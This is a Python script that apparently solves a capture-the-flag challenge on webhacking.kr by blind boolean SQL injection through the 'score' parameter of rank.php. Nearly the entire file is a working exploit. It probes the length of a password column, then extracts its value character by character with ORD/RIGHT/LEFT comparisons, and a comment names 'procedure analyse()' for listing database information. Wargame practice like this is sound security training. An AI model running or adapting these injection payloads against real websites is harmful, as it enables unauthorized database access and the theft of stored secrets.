import requests
import string

url = "https://webhacking.kr/challenge/web-31/rank.php?score=0 and "

def query(q):
  req = requests.get(url + q)
  print(req.url)
  content = req.text
  return content

# GET info database
#score=1000 limit 2,1 procedure analyse() 
# limit 2,1 to get all info database

# check length password
# len password = 31
def find_passwd():
  for i in range(1, 40):
    payload = f"(LENGTH(p4ssw0rd_1123581321) = {i})"
    if ("id :  //" not in query(payload)):
      print("Length password: ", i)
      break


def brute_force_passwd():
  temp = "FLAG{"
  LEN_passwd = 31
  for i in range(len(temp),LEN_passwd):
    for chr in string.ascii_lowercase + "}_?!":
      print(f"Trying: {temp + chr}")
      payload = f"ORD(RIGHT(LEFT(p4ssw0rd_1123581321,{i+1}),1))={ord(chr)}"
      if ("id :  //" not in query(payload)):
        print("Found: ", temp + chr)
        temp += chr
        break
      
brute_force_passwd()
# print(query(f"ORD(RIGHT(LEFT(p4ssw0rd_1123581321,1),1))={ord('F')}"))